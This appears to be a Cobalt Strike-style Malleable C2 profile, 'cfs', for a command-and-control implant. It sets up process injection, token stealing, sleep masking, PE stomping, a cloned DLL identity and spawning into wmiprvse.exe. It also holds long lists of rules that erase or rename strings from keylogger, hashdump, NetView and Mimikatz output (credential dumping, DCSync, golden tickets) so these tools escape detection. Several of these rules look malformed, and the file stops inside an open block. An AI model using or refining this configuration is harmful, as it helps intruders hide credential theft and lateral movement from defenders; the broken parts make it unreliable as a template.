#
# CFS - Complete Corrected Profile
# Full version with all settings preserved - FIXED
#

###############################################################################
## Global Settings
###############################################################################

set sample_name "cfs";
set host_stage "false";
set useragent "<RAND>";
set pipename "Winsock2\\CatalogChangeListener-####-0";
set pipename_stager "\\\\.\\pipe\\Winsock2\\CatalogChange####-####-0";
set create_remote_thread "true";
set hijack_remote_thread "true";
set tasks_max_size "2097152";
set steal_token_access_mask "0";
set sleeptime "30000";
set jitter "33";
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "LOCAL\\ubun-####-pipe-####-##";
set steal_token "true";   # نقلت إلى العام

###############################################################################
## Stage Block - Complete Configuration
###############################################################################

stage {
    set allocator "MapViewOfFile";
    set cleanup "true";
    set userwx "false";
    set sleep_mask "true";
    set stomppe "true";
    set obfuscate "true";
    # set syscall_mask "indirect";   # تم الإزالة (غير صالح)
    
    # Magic bytes
    set magic_mz_x86 "RZME";
    set magic_mz_x64 "QY";
    set magic_pe "##";

    # PE cloning - Complete settings
    set name "ActivationManager.dll";
    set checksum "7145538";
    set compile_time "18 Apr 2048 10:28:24";
    set entry_point "128240";
    set image_size_x64 "716800";
    set image_size_x86 "716800";
    set rich_header "\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";
    
    # Transform obfuscation
    transform-obfuscate {
        lznt1;
        rc4 "128";
    }
    
    # String replacements - X86
    transform-x86 {
        strrep "%c%c%c%c%c%c%c%c%c%cMSSE-%d-server" "";
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity error (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g) " "";
        strrep "(retval=%g)" "";
        strrep "MingW-w64 runtime failure:" "";
        strrep "VirtualAddress %pQuery has failed for %d-section bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery has failed for %d bytes at address %p" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
        prepend "\x90\x90";
    }
    
    # String replacements - X64
    transform-x64 {
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity error (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "MingW-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
        prepend "\x66\x87\xd2\x44\x48\x40\x90";
    }
}

###############################################################################
## Post-Exploitation Settings - Complete with all string replacements
###############################################################################

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiiprvse.exe -Embedding";
    set pipename "Winsock2\\CatalogChangeListener-####-0";
    set obfuscate "true";
    set smartinject "true";
    set cleanup "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    
    # Thread hints - ملاحظة: threadhint ليس هنا، بل في process-inject
    
    transform-x64 {
        # Port Scanner replacements - Full list
        strrep "PortScanner" "Scanner module is complete" "";
        strrep "PortScanner" "(ICMP) Target" "pmci trg=";
        strrep "PortScanner" "is alive." "is up.";
        strrep "PortScanner" "(ARP) Target" "rpa trg=";
        strrep "PortScanner" "[read %d bytes]" "";
        strrep "PortScanner" "[-] Error: Failed to initialise WinSock. Winsock error code " "";
        strrep "PortScanner" ". Extended error code" "";
        strrep "PortScanner" "platform:" "pltfm=";
        strrep "PortScanner" "version:" "vrs=";
        strrep "PortScanner" "name:" "name=";
        strrep "PortScanner" "domain:" "dmn=";
        
        # Hashdump
        strrep "Hashdump" "[-] no results." "";
        
        # Keylogger - Full replacements
        strrep "Keylogger" "________" "";
        strrep "Keylogger" "[backspace]" "<bckspce>";
        strrep "Keylogger" "[tab]" "<tab>";
        strrep "Keylogger" "[clear]" "<clr>";
        strrep "Keylogger" "[shift]" "<shft>";
        strrep "Keylogger" "[control]" "<ctrl>";
        strrep "Keylogger" "[alt]" "<alt>";
        strrep "Keylogger" "[pause]" "<pause>";
        strrep "Keylogger" "[caps lock]" "<cpslck>";
        strrep "Keylogger" "[escape]" "<esc>";
        strrep "Keylogger" "[page up]" "<pgup>";
        strrep "Keylogger" "[page down]" "<pgdwn>";
        strrep "Keylogger" "[end]" "<end>";
        strrep "Keylogger" "[home]" "<home>";
        strrep "Keylogger" "[left]" "<left>";
        strrep "Keylogger" "[up]" "<up>";
        strrep "Keylogger" "[right]" "<right>";
        strrep "Keylogger" "[down]" "<dwn>";
        strrep "Keylogger" "[prtscr]" "<prtsc>";
        strrep "Keylogger" "[insert]" "<insrt>";
        strrep "Keylogger" "[delete]" "<dlt>";
        strrep "Keylogger" "[help]" "<help>";
        strrep "Keylogger" "[command]" "<cmd>";
        strrep "Keylogger" "[menu]" "<menu>";
        strrep "Keylogger" "[F1]" "f1";
        strrep "Keylogger" "[F2]" "f2";
        strrep "Keylogger" "[F3]" "f3";
        strrep "Keylogger" "[F4]" "f4";
        strrep "Keylogger" "[F5]" "f5";
        strrep "Keylogger" "[F6]" "f6";
        strrep "Keylogger" "[F7]" "f7";
        strrep "Keylogger" "[F8]" "f8";
        strrep "Keylogger" "[F9]" "f9";
        strrep "Keylogger" "[F10]" "f10";
        strrep "Keylogger" "[F11]" "f11";
        strrep "Keylogger" "[F12]" "f12";
        strrep "Keylogger" "[F13]" "f13";
        strrep "Keylogger" "[F14]" "f14";
        strrep "Keylogger" "[F15]" "f15";
        strrep "Keylogger" "[F16]" "f16";
        strrep "Keylogger" "[F17]" "f17";
        strrep "Keylogger" "[F18]" "f18";
        strrep "Keylogger" "[F19]" "f19";
        strrep "Keylogger" "[F20]" "f20";
        strrep "Keylogger" "[F21]" "f21";
        strrep "Keylogger" "[F22]" "f22";
        strrep "Keylogger" "[F23]" "f23";
        strrep "Keylogger" "[F24]" "f24";
        strrep "Keylogger" "[numlock]" "<numlck>";
        strrep "Keylogger" "[scroll lock]" "<scrlck>";
        
        # NetView replacements - Full list
        strrep "NetView" "[-] Error:" "";
        strrep "NetView" "IP Address:" "ipaddr";
        strrep "NetView" "Server Name:" "srv";
        strrep "NetView" "Server Name" "srv";
        strrep "NetView" "------------------" "";
        strrep "NetView" "Domain Controllers" "DC";
        strrep "NetView" "Domain Computers" "PC";
        strrep "NetView" "Comment" "Desc";
        strrep "NetView" "Name" "name";
        strrep "NetView" "computers" "pc";
        strrep "NetView" "localhost" "local";
        strrep "NetView" "Computers:" "PC:";
        strrep "NetView" "Computers in domain" "PC domain";
        strrep "NetView" "dclist" "dc";
        strrep "NetView" "DCs" "dcs";
        strrep "NetView" "DCs in domain" "dcs domain";
        strrep "NetView" "Domain Controllers:" "dc:";
        strrep "NetView" "Domain Controllers in domain" "dc domain";
        strrep "NetView" "List of domain trusts:" "";
        strrep "NetView" "group" "grp";
        strrep "NetView" "Members of" "mbmrs of";
        strrep "NetView" "Groups:" "grps:";
        strrep "NetView" "Groups for" "grps for";
        strrep "NetView" "localgroup" "lclgrp";
        strrep "NetView" "Local groups for" "lcl grps for";
        strrep "NetView" "logons" "lgns";
        strrep "NetView" "Logged on users at" "lggon usrs at";
        strrep "NetView" "sessions" "sess";
        strrep "NetView" "Sessions for" "sess for";
        strrep "NetView" "share" "shre";
        strrep "NetView" "Shares at" "shres at";
        strrep "NetView" "Users for" "usrs for";
        strrep "NetView" "user" "usr";
        strrep "NetView" "Account information for" "acc info for";
        strrep "NetView" "List of hosts:" "hostlist:";
        strrep "NetView" "List of hosts for domain" "hostlist domain";
        strrep "NetView" "Idle (s)" "sleeping";
        strrep "NetView" "Active (s)" "alive";
        strrep "NetView" "User name" "usrname";
        strrep "NetView" "Computer" "pc";
        strrep "NetView" "Share name" "";
        strrep "NetView" "Current time at" "";
        strrep "NetView" "(Forest tree root)" "";
        strrep "NetView" "(Forest)" "";
        strrep "NetView" "(Primary Domain)" "";
        strrep "NetView" "(Direct Outbound)" "";
        strrep "NetView" "(Direct Inbound)" "";
        strrep "NetView" "(Native)" "";
        strrep "NetView" "Full Name" "";
        strrep "NetView" "User Comment" "";
        strrep "NetView" "Country code" "";
        strrep "NetView" "Account active" "";
        strrep "NetView" "Yes" "";
        strrep "NetView" "Never" "";
        strrep "NetView" "Account expires" "";
        strrep "NetView" "Admin" "";
        strrep "NetView" "Account type" "";
        strrep "NetView" "Guest" "";
        strrep "NetView" "User" "";
        strrep "NetView" "Password last set" "";
        strrep "NetView" "hours ago" "";
        strrep "NetView" "Password expires" "";
        strrep "NetView" "Password changeable" "";
        strrep "NetView" "Password required" "";
        strrep "NetView" "User may change password" "";
        strrep "NetView" "Workstations allowed" "";
        strrep "NetView" "Logon script" "";
        strrep "NetView" "User profile" "";
        strrep "NetView" "Home directory" "";
        strrep "NetView" "Last logon" "";
        strrep "NetView" "(admin)" "";
        strrep "NetView" "unknown" "";
        strrep "NetView" "Type" "";
        strrep "NetView" "Version" "";
        strrep "NetView" "Platform" "";
        strrep "NetView" "PDC" "";
        strrep "NetView" "BDC" "";
        
        # Mimikatz replacements - Full massive list (strrepex -> strrep)
        strrep "Mimikatz" "OK !" "";
        strrep "Mimikatz" "OK data copy" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_enum_kerberos_callback_pth ; kull_m_memory_copy (0x" "";
        strrep "Mimikatz" "\\_-" "";
        strrep "Mimikatz" "Ticket Granting Ticket" "tigranti";
        strrep "Mimikatz" "Client Ticket" "";
        strrep "Mimikatz" "Ticket Granting Service" "tigranse";
        strrep "Mimikatz" "Cachedirh:" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_sk_tryDecode ; SkpEncryptionWorker(decrypt):" "";
        strrep "Mimikatz" "-- invalidating the key" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_sk_candidatekey_add ; No key?" "";
        strrep "Mimikatz" "Encrypted:" "enc:";
        strrep "Mimikatz" "unkData2 :" "";
        strrep "Mimikatz" "* unkData1 :" "";
        strrep "Mimikatz" "AuthData :" "";
        strrep "Mimikatz" "Tag :" "";
        strrep "Mimikatz" "KdfContext:" "";
        strrep "Mimikatz" "* LSA Isolated Data:" "";
        strrep "Mimikatz" "* RootKey :" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_trymarshal ; CredUnmarshalCredential (0x" "";
        strrep "Mimikatz" "[?] ??" "";
        strrep "Mimikatz" "[UsernameForPacked] ?" "";
        strrep "Mimikatz" "[BinaryBlob]" "";
        strrep "Mimikatz" "[UsernameTarget]" "";
        strrep "Mimikatz" "Credential->cbSize is" "";
        strrep "Mimikatz" "[Cert] SHA1:" "1ahs";
        strrep "Mimikatz" "* Marshaled:" "";
        strrep "Mimikatz" "LUID KO" "";
        strrep "Mimikatz" "* Password:" "pwd";
        strrep "Mimikatz" "* Domain :" "";
        strrep "Mimikatz" "* Username :" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_genericCredsOutput ; Unknown version in Kerberos credentials structure" "";
        strrep "Mimikatz" "<no> kuhl_m_sekurlsa_buffer is incorrect" "";
        strrep "Mimikatz" "* Key :" "key:";
        strrep "Mimikatz" "Provider :" "";
        strrep "Mimikatz" "Container:" "";
        strrep "Mimikatz" "Reader :" "";
        strrep "Mimikatz" "Card :" "";
        strrep "Mimikatz" "PIN code :" "";
        strrep "Mimikatz" "* Smartcard" "";
        strrep "Mimikatz" "SHA1:" "sha1:";
        strrep "Mimikatz" "DPAPI Key:" "";
        strrep "Mimikatz" "PRT :" "";
        strrep "Mimikatz" "* Raw data :" "";
        strrep "Mimikatz" "* DPAPI :" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_genericCredsOutput ; Size error for NtlmHash LsaIso output" "";
        strrep "Mimikatz" "ERROR SHA1 kuhl_m_sekurlsa_genericCredsOutput ; Size error for NtlmHash LsaIso output" "";
        strrep "Mimikatz" "* LM1 :" "";
        strrep "Mimikatz" "* LM :" "";
        strrep "Mimikatz" "* NTLM :" "mtltn:";
        strrep "Mimikatz" "* NTLM :" "mtln:";
        strrep "Mimikatz" "* LM Domain :" "";
        strrep "Mimikatz" "* Domain :" "";
        strrep "Mimikatz" "* Username :" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; memory handle is not KULL_M_MEMORY_TYPE_PROCESS" "";
        strrep "Mimikatz" "\\_ kerberos -" "";
        strrep "Mimikatz" "\\_ msv1_0 -" "";
        strrep "Mimikatz" "| LUID" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; NtQueryObject:" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth_luid ; OpenProcess" "";
        strrep "Mimikatz" "is now R/W" "";
        strrep "Mimikatz" "was already Process R/W" "";
        strrep "Mimikatz" "| LSA Process" "";
        strrep "Mimikatz" "Missing at least one argument : ntlm/rc4 OR aes128 OR aes256" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Bad user or LUID" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; CreateProcessWithLogonW" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; OpenProcessToken" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; GetTokenInformationEx" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; DuplicateTokenEx" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; SetThreadToken" "";
        strrep "Mimikatz" "** Token Impersonation **" "";
        strrep "Mimikatz" "| TID %u" "";
        strrep "Mimikatz" "| : PID %u NTLM/RC4 key in a session" "";
        strrep "Mimikatz" "ERROR replacing kuhl_m_sekurlsa_pth ; ntlm hash/rc4 key length must be 32 (16 bytes)" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES256 key length must be 64 (32 bytes)" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; AES128 key length must be 32 (16 bytes)" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing argument : user" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_pth ; Missing argument : domain" "";
        strrep "Mimikatz" "impersonate" "";
        strrep "Mimikatz" "luid" "";
        strrep "Mimikatz" "SID :" "";
        strrep "Mimikatz" "Logon Time :" "";
        strrep "Mimikatz" "Logon Server :" "";
        strrep "Mimikatz" "Domain :" "";
        strrep "Mimikatz" "User Name :" "";
        strrep "Mimikatz" "Session Id :" "";
        strrep "Mimikatz" "Authentication Id :" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory" "";
        strrep "Mimikatz" "Unknown !" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Memory opening" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Local LSA library failed" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Modules informations" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; Key import" "";
        strrep "Mimikatz" "candidate Secure keys found" "";
        strrep "Mimikatz" "> bytes) Kernel stream found in minidump (" "";
        strrep "Mimikatz" "ERROR kuhl_m_sekurlsa_acquireLSA ; LSASS process not found (?)" "";
        strrep "Mimikatz" "file for minidump ... " "";
        strrep "Mimikatz" "Opening :" "";
        strrep "Mimikatz" "SekurLSA module" "";
        strrep "Mimikatz" "List Credentials Manager" "";
        strrep "Mimikatz" "List Cached MasterKeys" "";
        strrep "Mimikatz" "List Kerberos Encryption Keys" "";
        strrep "Mimikatz" "List Kerberos tickets" "";
        strrep "Mimikatz" "Preferred Backup Master keys" "";
        strrep "Mimikatz" "Antisocial" "";
        strrep "Mimikatz" "DPAPI_SYSTEM secret" "";
        strrep "Mimikatz" "dpapisystem" "";
        strrep "Mimikatz" "krbtgt!" "";
        strrep "Mimikatz" "Pass-the-hash" "";
        strrep "Mimikatz" "Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials" "";
        strrep "Mimikatz" "Switch (or reinit) to LSASS minidump context" "";
        strrep "Mimikatz" "Lists CloudApAp credentials" "";
        strrep "Mimikatz" "Switch (or reinit) to LSASS process context" "";
        strrep "Mimikatz" "Lists (or available) to providers process credentials" "";
        strrep "Mimikatz" "List SSP credentials" "";
        strrep "Mimikatz" "Lists LiveSSP credentials" "";
        strrep "Mimikatz" "Lists TsPkg credentials" "";
        strrep "Mimikatz" "Lists Kerberos credentials" "";
        strrep "Mimikatz" "Lists WDigest credentials" "";
        strrep "Mimikatz" "Lists LM & NTLM credentials" "";
        strrep "Mimikatz" "Some LM & NTLM to enumerate credentials ... " "";
        strrep "Mimikatz" "Try to decrypt" "";
        strrep "Mimikatz" "Try to sign" "";
        strrep "Mimikatz" "Try to decrypt a PIN Protector" "";
        strrep "Mimikatz" "Verify Name for:" "";
        strrep "Mimikatz" "SessionNameKey:" "";
        strrep "Mimikatz" "pNC->Name:" "";
        strrep "Mimikatz" "pNC->Sid :" "";
        strrep "Mimikatz" "pNC->Guid :" "";
        strrep "Mimikatz" "(not an object GUID)" "";
        strrep "Mimikatz" "Link to key with GUID:" "";
        strrep "Mimikatz" "** TRUSTED DOMAIN - Antisocial **" "";
        strrep "Mimikatz" "BKUPKEY_PREFERRED - BACKUPKEY_P Secret" "";
        strrep "Mimikatz" "BKUPKEY_P Secret" "";
        strrep "Mimikatz" "BKUPKEY_" "";
        strrep "Mimikatz" "Unknown data :" "";
        strrep "Mimikatz" "Last change:" "";
        strrep "Mimikatz" "Password :" "pwd:";
        strrep "Mimikatz" "Partner :" "";
        strrep "Mimikatz" "LAPS:" "";
        strrep "Mimikatz" "Credentials:" "";
        strrep "Mimikatz" "Object Relative ID :" "";
        strrep "Mimikatz" "Object Security ID :" "";
        strrep "Mimikatz" "Password history last change :" "";
        strrep "Mimikatz" "Account expiration :" "";
        strrep "Mimikatz" "User Account Control :" "";
        strrep "Mimikatz" "Account Type :" "";
        strrep "Mimikatz" "User Principal Name :" "";
        strrep "Mimikatz" "SAM Username :" "";
        strrep "Mimikatz" "** SAM ACCOUNT **" "";
        strrep "Mimikatz" "Key Package :" "[";
        strrep "Mimikatz" "Key Package Size :" "";
        strrep "Mimikatz" "byte(s)" "";
        strrep "Mimikatz" "Recovery Password (fake) :" "";
        strrep "Mimikatz" "Recovery GUID :" "";
        strrep "Mimikatz" "Volume GUID :" "";
        strrep "Mimikatz" "** BITLOCKER RECOVERY INFORMATION **" "";
        strrep "Mimikatz" "Object RDN :" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_describeObject_csv ; RtlDecryptNtOwFPwdWithIndex" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_decrypt ; RtlDecryptNtOwFPwdWithIndex/RtlDecryptLmOwFPwdWithIndex" "";
        strrep "Mimikatz" "Hash :" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; ldap_search_s 0x" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; More than one entry?" "";
        strrep "Mimikatz" "[ldap]" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId ; No values?" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDN" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Domain Controller not present" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; Missing user or guid argument" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; RPC Exception 0x" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; DRSGetNCChanges, invalid dwOutVersion (" "";
        strrep "Mimikatz" ") and/or cNumObjects (" "";
        strrep "Mimikatz" "ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply" "";
        strrep "Mimikatz" "[will be the userIntId ms-DS-ReplicationEpoch is:" "";
        strrep "Mimikatz" "[DC] Object with GUID" "";
        strrep "Mimikatz" "[DC] Exporting domain" "";
        strrep "Mimikatz" "Revert to process token" "";
        strrep "Mimikatz" "Impersonation" "";
        strrep "Mimikatz" "Identification" "";
        strrep "Mimikatz" "Anonymous" "";
        strrep "Mimikatz" "Run!" "";
        strrep "Mimikatz" "Impersonate a token" "";
        strrep "Mimikatz" "List all tokens of the system" "";
        strrep "Mimikatz" "Display current identity" "";
        strrep "Mimikatz" "UasServer" "";
        strrep "Mimikatz" "TrustedDomain" "";
        strrep "Mimikatz" "[DC]" "";
        strrep "Mimikatz" "TrustedDnsDomain" "";
        strrep "Mimikatz" "Export" "";
        strrep "Mimikatz" "* Unknown key : seen as" "";
        strrep "Mimikatz" "* Legacy key" "";
        strrep "Mimikatz" "out-1" "";
        strrep "Mimikatz" "In-1" "";
        strrep "Mimikatz" "unknown?" "";
        strrep "Mimikatz" "Random Value :" "";
        strrep "Mimikatz" "OlderCredentials" "";
        strrep "Mimikatz" "Default Iterations :" "";
        strrep "Mimikatz" "Default Salt :" "";
        strrep "Mimikatz" "OldCredentials Salt" "";
        strrep "Mimikatz" "Default MSCache v2 (from registry or hives)" "";
        strrep "Mimikatz" "NTLM-Strong-NTOWF" "";
        strrep "Mimikatz" "Kerberos-Newer-Keys" "";
        strrep "Mimikatz" "Supplemental Credentials:" "";
        strrep "Mimikatz" "LsaDump module" "";
        strrep "Mimikatz" "Skew1" "";
        strrep "Mimikatz" "Ask a DC to send current and previous NTLM hash of DC/SRV/WKS" "";
        strrep "Mimikatz" "Ask a DC server to set a new password/ntlm for one user/SRV/WKS" "";
        strrep "Mimikatz" "Ask a DC to synchronize an object" "";
        strrep "Mimikatz" "Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)" "";
        strrep "Mimikatz" "Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)" "";
        strrep "Mimikatz" "Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)" "";
        strrep "Mimikatz" "Get the SysKey to decrypt SECRETS entries (from registry or hives)" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; kull_m_file_writeData (" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; No suitable file exportData type for key group:" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; NCryptExportKey" "";
        strrep "Mimikatz" "-- init):" "";
        strrep "Mimikatz" "-- data):" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; kull_m_string_EncodeB64_headers (" "";
        strrep "Mimikatz" "PRIVATE KEY" "";
        strrep "Mimikatz" "Algorithm Group" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; CryptExportKey(init) (0x" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; CryptExportKey(data) (0x" "";
        strrep "Mimikatz" "Private export :" ""; 
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportRawKeyToFile ; kull_m_file_writeData (0x" "";
        strrep "Mimikatz" "KO -" "";
        strrep "Mimikatz" "OK -" "";
        strrep "Mimikatz" "Private raw export :" "";
        strrep "Mimikatz" "ERROR kuhl_m_crypto_exportRawKeyToFile ; CryptImportKey (0x" "";
        strrep "Mimikatz" "Key permissions:" "";
        strrep "Mimikatz" "|Unique name :" "";
        strrep "Mimikatz" "|Key Container :" "";
        strrep "Mimikatz" "|Provider name :" "";
        strrep "Mimikatz" "LSA isolation :" "";
        strrep "Mimikatz" "Exportable key :" "";
        strrep "Mimikatz" "Export policy :" "";
        strrep "Mimikatz" "Key size :" "";
        strrep "Mimikatz" "Algorithm :" "";
        strrep "Mimikatz" "Algorithm Name" "";
        strrep "Mimikatz" "Unique Name" "";
        strrep "Mimikatz" "Key Container :" "";
        strrep "Mimikatz" "|Implementation:" "";
        strrep "Mimikatz" "Impl Type" "";
        strrep "Mimikatz" "|Provider name :" "";
        strrep "Mimikatz" "Provider Handle" "";
        strrep "Mimikatz" "(null)" "";
        strrep "Mimikatz" "[!%hu!]" "";
        strrep "Mimikatz" "[BOOL ]" "";
        strrep "Mimikatz" "[STRING]" "";
        strrep "Mimikatz" "[UINT64]" "";
        strrep "Mimikatz" "[INT64 ]" "";
        strrep "Mimikatz" "Id:" "";
        strrep "Mimikatz" "* PAC signed" "";
        strrep "Mimikatz" "* PAC generated" "";
        strrep "Mimikatz" "ERROR PAC kuhl_m_kerberos_golden ; Missing user argument" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing domain argument" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Domain name does not look like a FQDN" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing krbtgt key argument (/rc4 or /aes128 or /aes256)" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Krbtgt key size length must be " "";
        strrep "Mimikatz" " bytes) for" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_golden ; BerApp_KrbCred error" "";
        strrep "Mimikatz" "kull_m_file_writeData (golden;" "";
        strrep "Mimikatz" "Final Ticket Saved to file !" "";
        strrep "Mimikatz" "successfully submitted for current session" "";
        strrep "Mimikatz" "Golden Ticket ticket for" "";
        strrep "Mimikatz" "→ Ticket :" "";
        strrep "Mimikatz" "** Pass The Ticket **" "";
        strrep "Mimikatz" "Lifetime :" "";
        strrep "Mimikatz" "Target :" "";
        strrep "Mimikatz" "Service :" "";
        strrep "Mimikatz" "ServiceKey :" "";
        strrep "Mimikatz" "Claims :" "";
        strrep "Mimikatz" "Extra SIDs:" "";
        strrep "Mimikatz" "Groups Id : *" "";
        strrep "Mimikatz" "Session Id :" "";
        strrep "Mimikatz" "User Id :" "";
        strrep "Mimikatz" "SID :" "";
        strrep "Mimikatz" "Domain :" "";
        strrep "Mimikatz" "User :" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage : %" "";
        strrep "Mimikatz" "ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package :" "";
        strrep "Mimikatz" "Kerberos package module" "";
        strrep "Mimikatz" "List tickets in NT6/Heimdall cache" "";
        strrep "Mimikatz" "Pass-the-ticket [NT6]" "";
        strrep "Mimikatz" "Hash password to keys" "";
        strrep "Mimikatz" "Willy Wonka factory" "";
        strrep "Mimikatz" "Purge ticket(s)" "";
        strrep "Mimikatz" "Retrieve current TGT" "";
        strrep "Mimikatz" "Ask or get TGS tickets" "";
        strrep "Mimikatz" "List ticket(s)" "";
        strrep "Mimikatz" "Pass-the-ticket [NT 6]" "";
        strrep "Mimikatz" "Virtual Iso" "";
        strrep "Mimikatz" "ERROR kuhl_m_dpapi_oe_domainkey_add ; No GUID or Key?" "";
        strrep "Mimikatz" "ERROR kuhl_m_dpapi_oe_credential_add ; No SID?" "";
        strrep "Mimikatz" "[DC] " "";
        strrep "Mimikatz" "will be the DC server" "";
        strrep "Mimikatz" "will be the domain server" "";
        strrep "Mimikatz" "Description :" "";
        strrep "Mimikatz" "Full name :" "";
        strrep "Mimikatz" "Module :" "";
        strrep "Mimikatz" "ERROR mimikatz_doLocal ;" "";
        strrep "Mimikatz" "command not found !" "";
        strrep "Mimikatz" "module not loaded !" "";
        strrep "Mimikatz" ">>>" "";
        strrep "Mimikatz" "module failed :" "";
        strrep "Mimikatz" "ERROR mimikatz_initOrClean ; CoInitializeEx:" "";
        strrep "Mimikatz" "mimikatz 2.2.0-20220919 (x64) #19041 Mar 27 2024 11:34:27" "";
